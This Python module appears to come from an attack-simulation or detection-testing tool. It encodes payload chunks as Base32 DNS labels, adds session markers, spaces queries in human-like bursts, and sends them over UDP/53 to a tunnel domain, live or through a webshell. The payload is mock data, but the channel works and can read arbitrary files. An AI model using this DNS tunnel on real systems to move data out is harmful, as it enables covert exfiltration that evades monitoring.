"""DNS Tunnel encoder and chunk generator — idx-pattern FQDNs."""

from __future__ import annotations

import base64
import random
import re
import time
import uuid
from pathlib import Path
from typing import Any, Callable, Iterator

from dsp.engine.scenario_engine import TargetSet
from dsp.protocols.base import DnsProtocolError
from dsp.protocols.dns.volume_profiles import apply_volume_profile

CHUNK_SIZE_DEFAULT = 30
PAYLOAD_MB_DEFAULT = 0.5
DNS_TUNNEL_SESSION_MAX_TIMEOUT_SEC = 900
TUNNEL_DOMAIN_DEFAULT = "dns-tunnel.com"
MOCK_PAYLOAD_FILENAME = "mock_exfil.dat"
MOCK_PAYLOAD_PATTERN = b"MOCK-DNS-TUNNEL-EXFIL-DATA-"
SEND_INTERVAL_SEC = 0.01
FAST_MODE_TIMEOUT_STREAK = 3
RECV_TIMEOUT_SEC = 0.05
BURST_MIN_QUERIES = 5
BURST_MAX_QUERIES = 10
BURST_PAUSE_MIN_SEC = 0.5
BURST_PAUSE_MAX_SEC = 2.0
IDX_FQDN_PATTERN = re.compile(r"^idx-\d{4,}-[a-z2-7]+\.", re.IGNORECASE)


def chunk_to_b32_label(chunk: bytes) -> str:
    """Encode raw chunk bytes as lowercase unpadded Base32 label."""
    return base64.b32encode(chunk).decode("ascii").lower().rstrip("=")


def filename_to_b32_label(filename: str) -> str:
    """Encode a filename as lowercase unpadded Base32 for strt- session marker."""
    return chunk_to_b32_label(filename.encode("ascii"))


def generate_mock_payload_bytes(payload_mb: float) -> bytes:
    """Return deterministic non-malicious mock payload bytes (~payload_mb)."""
    if payload_mb <= 0:
        raise DnsProtocolError("payload_mb must be positive")
    total_bytes = int(payload_mb * 1024 * 1024)
    if total_bytes < CHUNK_SIZE_DEFAULT:
        total_bytes = CHUNK_SIZE_DEFAULT
    pattern = MOCK_PAYLOAD_PATTERN
    repeats = (total_bytes + len(pattern) - 1) // len(pattern)
    return (pattern * repeats)[:total_bytes]


def write_mock_payload_file(path: Path, payload_mb: float) -> Path:
    """Write deterministic mock payload file and return its path."""
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(generate_mock_payload_bytes(payload_mb))
    return path


def iter_file_chunks(path: Path, chunk_size: int = CHUNK_SIZE_DEFAULT) -> Iterator[bytes]:
    """Read a payload file in fixed-size chunks."""
    if chunk_size <= 0:
        raise DnsProtocolError("chunk_size must be positive")
    with path.open("rb") as handle:
        while True:
            chunk = handle.read(chunk_size)
            if not chunk:
                break
            yield chunk


def compute_dns_tunnel_session_timeout_sec(
    payload_mb: float,
    chunk_size: int = CHUNK_SIZE_DEFAULT,
    send_interval: float = SEND_INTERVAL_SEC,
    *,
    max_chunks: int | None = None,
    margin_sec: float = 180.0,
    empirical_qps: float = 65.0,
) -> int:
    """Estimate wall time for a full mock-file tunnel session (detached webshell).

    Uses the greater of nominal send_interval budget and empirical lab qps (~65–72)
    so 1MB sessions are not cut near the end on slower hosts.
    """
    idx_count = plan_chunk_count(payload_mb, chunk_size)
    if max_chunks is not None:
        idx_count = min(idx_count, int(max_chunks))
    total_queries = idx_count + 2
    send_budget = total_queries * send_interval
    rate = max(1.0, float(empirical_qps))
    empirical_budget = total_queries / rate
    return min(
        DNS_TUNNEL_SESSION_MAX_TIMEOUT_SEC,
        int(max(send_budget, empirical_budget) + margin_sec),
    )


def plan_chunk_count(payload_mb: float, chunk_size: int = CHUNK_SIZE_DEFAULT) -> int:
    """Return number of fixed-size chunks for a payload volume."""
    if payload_mb <= 0:
        raise DnsProtocolError("payload_mb must be positive")
    if chunk_size <= 0:
        raise DnsProtocolError("chunk_size must be positive")
    total_bytes = int(payload_mb * 1024 * 1024)
    return max(1, (total_bytes + chunk_size - 1) // chunk_size)


def plan_burst_schedule(
    total: int,
    *,
    burst_min: int = BURST_MIN_QUERIES,
    burst_max: int = BURST_MAX_QUERIES,
) -> list[int]:
    """Split total DNS tunnel queries into human-like burst sizes."""
    if total <= 0:
        raise DnsProtocolError("total queries must be positive")
    if burst_min <= 0 or burst_max < burst_min:
        raise DnsProtocolError("invalid burst size range")

    schedule: list[int] = []
    remaining = total
    while remaining > 0:
        size = min(random.randint(burst_min, burst_max), remaining)
        schedule.append(size)
        remaining -= size
    return schedule


def sample_burst_pause_sec(
    *,
    pause_min: float = BURST_PAUSE_MIN_SEC,
    pause_max: float = BURST_PAUSE_MAX_SEC,
) -> float:
    """Return a random inter-burst pause duration."""
    if pause_min <= 0 or pause_max < pause_min:
        raise DnsProtocolError("invalid burst pause range")
    return random.uniform(pause_min, pause_max)


def iter_payload_chunks(
    payload_mb: float,
    chunk_size: int = CHUNK_SIZE_DEFAULT,
    *,
    seed: int | None = None,
) -> Iterator[bytes]:
    """Yield fixed-size deterministic mock payload chunks up to payload_mb."""
    data = generate_mock_payload_bytes(payload_mb)
    if seed is not None:
        rng = random.Random(seed)
        offset = rng.randint(0, max(0, len(data) - chunk_size)) if len(data) > chunk_size else 0
        data = data[offset:] + data[:offset]
    produced = 0
    while produced < len(data):
        need = min(chunk_size, len(data) - produced)
        yield data[produced : produced + need]
        produced += need


def build_tunnel_fqdn(seq: int, payload_b32: str, domain: str) -> str:
    """Build idx-{seq:04d}-{payload}.{domain} FQDN."""
    if seq < 0:
        raise DnsProtocolError("chunk sequence must be >= 0")
    domain = domain.strip().rstrip(".")
    if not domain:
        raise DnsProtocolError("tunnel domain is required")
    if not payload_b32:
        raise DnsProtocolError("payload label is required")
    label = f"idx-{seq:04d}-{payload_b32}"
    if len(label) > 63:
        raise DnsProtocolError(f"DNS label exceeds 63 bytes: {len(label)}")
    fqdn = f"{label}.{domain}"
    if not is_valid_tunnel_fqdn(fqdn):
        raise DnsProtocolError(f"invalid tunnel FQDN: {fqdn}")
    return fqdn


def is_valid_tunnel_fqdn(fqdn: str) -> bool:
    """Return True when FQDN matches idx-0000-{payload}.{domain}."""
    return bool(IDX_FQDN_PATTERN.match(fqdn))


def build_tunnel_start_fqdn(filename: str, domain: str) -> str:
    """Build strt-{base32(filename)}.{domain} session start marker."""
    domain = domain.strip().rstrip(".")
    if not domain:
        raise DnsProtocolError("tunnel domain is required")
    label = f"strt-{filename_to_b32_label(filename)}"
    if len(label) > 63:
        raise DnsProtocolError(f"DNS label exceeds 63 bytes: {len(label)}")
    return f"{label}.{domain}"


def build_tunnel_end_fqdn(domain: str) -> str:
    """Build end-0.{domain} session end marker."""
    domain = domain.strip().rstrip(".")
    if not domain:
        raise DnsProtocolError("tunnel domain is required")
    return f"end-0.{domain}"


def build_tunnel_session_marker_fqdn(session_id: str, marker: str, domain: str) -> str:
    """Legacy helper — prefer build_tunnel_start_fqdn / build_tunnel_end_fqdn."""
    domain = domain.strip().rstrip(".")
    if not domain:
        raise DnsProtocolError("tunnel domain is required")
    if marker not in {"strt", "end"}:
        raise DnsProtocolError(f"invalid session marker: {marker}")
    if marker == "end":
        return build_tunnel_end_fqdn(domain)
    return f"{marker}-{session_id}.{domain}"


def select_tunnel_targets(
    targets: TargetSet,
    config: dict,
    *,
    max_hosts: int = 2,
) -> list[str]:
    """Select DNS tunnel query targets from Live Host Discovery (alive hosts only)."""
    if config.get("targets"):
        return [str(t) for t in config["targets"]][:max_hosts]

    alive_hosts = [str(h) for h in targets.hosts][:max_hosts]
    if alive_hosts:
        return alive_hosts

    return []


def build_dns_tunnel_query_entry(
    target: str,
    fqdn: str,
    *,
    seq: int | None = None,
    chunk_bytes: int | None = None,
    label_length: int | None = None,
    query_role: str = "idx_chunk",
    session_id: str | None = None,
) -> dict[str, Any]:
    """Build a DNS tunnel query record with standardized traffic evidence fields."""
    entry: dict[str, Any] = {
        "target": target,
        "resolver": target,
        "fqdn": fqdn,
        "query": fqdn,
        "protocol": "dns_udp",
        "port": 53,
        "query_role": query_role,
        "idx_pattern": is_valid_tunnel_fqdn(fqdn),
    }
    if seq is not None:
        entry["seq"] = seq
    if chunk_bytes is not None:
        entry["chunk_bytes"] = chunk_bytes
    if label_length is not None:
        entry["label_length"] = label_length
    if session_id is not None:
        entry["session_id"] = session_id
    return entry


def build_dns_tunnel_queries(
    hosts: list[str],
    *,
    payload_mb: float,
    chunk_size: int = CHUNK_SIZE_DEFAULT,
    domain: str = TUNNEL_DOMAIN_DEFAULT,
    max_chunks: int | None = None,
    include_session_markers: bool = True,
    session_id: str | None = None,
    plan_seed: int | None = None,
    mock_filename: str = MOCK_PAYLOAD_FILENAME,
) -> tuple[list[dict[str, Any]], str]:
    """Build idx-pattern DNS tunnel query list for one or more alive hosts."""
    if not hosts:
        return [], session_id or uuid.uuid4().hex[:6]

    sid = session_id or uuid.uuid4().hex[:6]
    total = plan_chunk_count(payload_mb, chunk_size)
    if max_chunks is not None:
        total = min(total, int(max_chunks))

    queries: list[dict[str, Any]] = []
    for target in hosts:
        chunk_iter = iter_payload_chunks(payload_mb, chunk_size, seed=plan_seed)
        if include_session_markers:
            strt_fqdn = build_tunnel_start_fqdn(mock_filename, domain)
            queries.append(
                build_dns_tunnel_query_entry(
                    target,
                    strt_fqdn,
                    query_role="session_start",
                    session_id=sid,
                )
            )
        for seq in range(0, total):
            chunk = next(chunk_iter)
            label = chunk_to_b32_label(chunk)
            fqdn = build_tunnel_fqdn(seq, label, domain)
            queries.append(
                build_dns_tunnel_query_entry(
                    target,
                    fqdn,
                    seq=seq,
                    chunk_bytes=len(chunk),
                    label_length=len(label),
                    session_id=sid,
                )
            )
        if include_session_markers:
            end_fqdn = build_tunnel_end_fqdn(domain)
            queries.append(
                build_dns_tunnel_query_entry(
                    target,
                    end_fqdn,
                    query_role="session_end",
                    session_id=sid,
                )
            )
    return queries, sid


def plan_dns_tunnel(
    targets: TargetSet,
    params: dict[str, Any],
    *,
    dry_run: bool,
) -> dict[str, Any]:
    """Build a complete DNS tunnel execution plan (local, webshell, remote discovery)."""
    tuned = apply_volume_profile(params, dry_run=dry_run)
    payload_mb = float(tuned.get("payload_mb", PAYLOAD_MB_DEFAULT))
    chunk_size = int(tuned.get("chunk_size", CHUNK_SIZE_DEFAULT))
    domain = str(tuned.get("domain", TUNNEL_DOMAIN_DEFAULT))
    max_hosts = int(tuned.get("max_hosts", 2))
    max_chunks = tuned.get("max_chunks")
    include_session_markers = bool(tuned.get("include_session_markers", True))
    mock_filename = str(tuned.get("mock_filename", MOCK_PAYLOAD_FILENAME))
    plan_seed = tuned.get("plan_seed")
    seed = int(plan_seed) if plan_seed is not None else None

    hosts = select_tunnel_targets(targets, tuned, max_hosts=max_hosts)
    if not hosts:
        return {"type": "dns_tunnel", "mode": "skip", "reason": "no_alive_hosts"}

    queries, session_id = build_dns_tunnel_queries(
        hosts,
        payload_mb=payload_mb,
        chunk_size=chunk_size,
        domain=domain,
        max_chunks=int(max_chunks) if max_chunks is not None else None,
        include_session_markers=include_session_markers,
        plan_seed=seed,
        mock_filename=mock_filename,
    )
    return {
        "type": "dns_tunnel",
        "mode": "mock" if dry_run else "live",
        "domain": domain,
        "payload_mb": payload_mb,
        "chunk_size": chunk_size,
        "mock_filename": mock_filename,
        "timeout": float(tuned.get("timeout", RECV_TIMEOUT_SEC)),
        "send_interval_sec": float(tuned.get("send_interval_sec", SEND_INTERVAL_SEC)),
        "queries": queries,
        "session_id": session_id,
        "target_selection": "alive_hosts",
        "plan_seed": seed,
        "max_chunks": int(max_chunks) if max_chunks is not None else None,
    }


class DnsTunnelTransmitter:
    """Send UDP/53 tunnel queries via sendto only — no DNS response wait."""

    def __init__(
        self,
        client: Any,
        target: str,
        *,
        send_interval: float = SEND_INTERVAL_SEC,
    ) -> None:
        self._client = client
        self._target = target
        self._send_interval = send_interval

    def send(self, fqdn: str) -> Any:
        """Send one tunnel query and sleep send_interval_sec afterward."""
        if self._client.mode == "mock":
            result = self._client.send_fire_and_forget(
                self._target,
                fqdn,
                mock_outcome="sent",
            )
        else:
            result = self._client.send_fire_and_forget(self._target, fqdn)
        if self._send_interval > 0:
            time.sleep(self._send_interval)
        return result


def transmit_planned_queries(
    transmitter: DnsTunnelTransmitter,
    queries: list[dict[str, Any]],
    *,
    cancelled: Callable[[], bool] | None = None,
) -> list[tuple[dict[str, Any], Any]]:
    """Send planned tunnel queries in order; continue even without DNS responses."""
    sent: list[tuple[dict[str, Any], Any]] = []
    for item in queries:
        if cancelled and cancelled():
            break
        fqdn = str(item["fqdn"])
        result = transmitter.send(fqdn)
        sent.append((item, result))
    return sent


DNS_TUNNEL_SENT_LINE_PREFIX = "DNS_TUNNEL_SENT:"
DNS_TUNNEL_SESSION_DONE_MARKER = "DNS_TUNNEL_SESSION_DONE"


def parse_dns_tunnel_session_sent_fqdns(text: str) -> frozenset[str]:
    """Return FQDNs reported as successfully sendto'd by the remote session script."""
    sent: set[str] = set()
    for line in text.splitlines():
        stripped = line.strip()
        if stripped.startswith(DNS_TUNNEL_SENT_LINE_PREFIX):
            fqdn = stripped[len(DNS_TUNNEL_SENT_LINE_PREFIX) :].strip()
            if fqdn:
                sent.add(fqdn)
    return frozenset(sent)


def dns_tunnel_session_script_completed(text: str) -> bool:
    """Return True when remote session script printed its completion marker."""
    return DNS_TUNNEL_SESSION_DONE_MARKER in text


def dns_tunnel_query_evidence(item: dict[str, Any]) -> dict[str, Any]:
    """Return standardized evidence fields for dns_tunnel_query_sent events."""
    fqdn = str(item.get("fqdn") or item.get("query") or "")
    target = str(item.get("target") or "")
    return {
        "target": target,
        "resolver": str(item.get("resolver") or target),
        "fqdn": fqdn,
        "query": str(item.get("query") or fqdn),
        "protocol": str(item.get("protocol") or "dns_udp"),
        "port": int(item.get("port") or 53),
        "idx_pattern": bool(item.get("idx_pattern", is_valid_tunnel_fqdn(fqdn))),
        **{k: item[k] for k in ("seq", "chunk_bytes", "label_length", "session_id", "query_role") if k in item},
    }
